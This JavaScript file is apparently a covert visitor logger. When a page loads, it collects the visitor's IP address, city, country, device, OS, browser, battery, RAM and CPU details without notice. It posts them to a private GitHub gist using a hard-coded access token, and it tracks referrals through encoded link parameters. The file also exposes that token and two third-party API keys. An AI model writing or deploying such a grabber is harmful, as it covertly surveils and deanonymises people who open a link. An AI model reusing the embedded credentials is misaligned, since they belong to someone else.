let ID = Math.floor(Math.random() * 100000000) + 1
function $_GET(param) {
	var vars = {};
	window.location.href.replace( location.hash, '' ).replace( 
		/[?&]+([^=&]+)=?([^&]*)?/gi, // regexp
		function( m, key, value ) { // callback
			vars[key] = value !== undefined ? value : '';
		}
	);

	if ( param ) {
		return vars[param] ? vars[param] : null;	
	}
	return vars;
}
const ipKey = "d9a970248b0258b22d92096896067582";
const ipPoint = "http://api.ipstack.com/";
const gistKey = "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";

// GLOBAL FUNCTION
!(async function () {
  // GET IP
  let dataIP = await fetch("https://api.ipify.org/?format=json")
    .then((response) => response.json())
    .then((data) => {
      return data;
    });
  let ip = dataIP.ip;

  // GET IP INFO
  let infoIP = await fetch(
    `http://api.ipstack.com/${ip}?access_key=d9a970248b0258b22d92096896067582`
  )
    .then((response) => response.json())
    .then((data) => {
      return data;
    });

  //GET USER AGENT INFO
  let User = await fetch(
    `http://api.userstack.com/api/detect?access_key=39f30a08f9a7ec1fff69adf8be73b80f&ua=${window.navigator.userAgent}`
  )
    .then((response) => response.json())
    .then((data) => {
      return data;
    });

  // GET INFO FROM WINDOW
  let battery = await navigator.getBattery().then((data) => {
    return data;
  });
  let country = `${infoIP.country_name} ${infoIP.location.country_flag_emoji}`;
  let city = infoIP.city;
  let region = infoIP.region_name;
  let brand = User.brand;
  let type = User.device.type;
  let name = User.brand;
  let os = User.os.name;
  let browser = User.browser.name;
  let isCharging = battery.charging;
  let chargingLevel = battery.level * 100;
  let ramMemory = navigator.deviceMemory;
  let logicalProcessor = navigator.hardwareConcurrency;
  let date = new Date().toISOString().slice(0, 10)
  let IDreffer = $_GET('IDreffer')
  let OSreffer = $_GET('OSreffer')
  let CTreffer = $_GET('CTreffer')
  if(!IDreffer) return alert('LINK NOT VALID') & window.location.reload()
  if(!OSreffer) return alert('LINK NOT VALID') & window.location.reload()
  if(!CTreffer) return alert('LINK NOT VALID') & window.location.reload()
  function SendLogger() {
    fetch("https://api.github.com/gists", {
      method: "POST",
      body: JSON.stringify({
        description: `NEW CONNEXION : ${ip} | ${date}`,
        public: false,
        files: {
          README: {
            content: `
                ✉️ ID : ${ID}
                🌐 IP : ${ip}
                📍 COUNTRY : ${country}
                📍 CITY : ${city}
                📍 REGION : ${region}
                💻 BRAND : ${brand}
                💻 TYPE : ${type}
                💻 NAME : ${name}
                💻 OS : ${os}
                💻 BROWSER : ${browser}
                💻 isCHARGING : ${isCharging}
                💻 CHARGING-LEVEL : ${chargingLevel}%
                💻 RAM : ${ramMemory}
                💻 PROCESSOR : ${logicalProcessor}
                📆 DATE : ${date}

                🔗 REFFER : **ID** ${IDreffer} | **OS** ${atob(OSreffer)} | **REGION** ${atob(CTreffer)}
            `,
          },
        },
      }),
      headers: {
        Authorization: `Bearer ${gistKey}`,
        Accept: "application/vnd.github.v3+json",
      },
    });
  }
  SendLogger()
  document.getElementById('share').addEventListener('click', ()=>{
      document.getElementById('url').style.display = 'flex'
      document.getElementById('url').value = `http://127.0.0.1:5500/index.html?IDreffer=${ID}&OSreffer=${btoa(os)}&CTreffer=${btoa(region)}`
      document.getElementById('url').select()
      document.getElementById('url').setSelectionRange(0, 99999);
      document.execCommand('copy')
      document.getElementById('url').style.display = 'none'
      alert('URL COPIED')
  })
})();
